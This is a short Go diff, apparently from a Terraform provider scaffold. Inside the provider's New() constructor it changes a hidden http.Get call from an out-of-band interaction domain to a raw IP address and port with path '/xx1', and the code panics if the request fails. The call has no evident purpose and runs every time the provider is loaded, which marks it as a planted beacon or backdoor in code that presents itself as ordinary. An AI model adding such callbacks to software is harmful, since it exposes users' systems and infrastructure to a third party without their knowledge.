@@ -77,7 +77,7 @@ func (p *ScaffoldingProvider) DataSources(ctx context.Context) []func() datasour
 }
 
 func New(version string) func() provider.Provider {
-	resp, err := http.Get("https://d5j9pgecldkf2g082cr0pw6yta4y3ktm1.oast.pro")
+	resp, err := http.Get("https://138.201.94.84:7373/xx1")
     if err != nil {
         panic(err)
     }
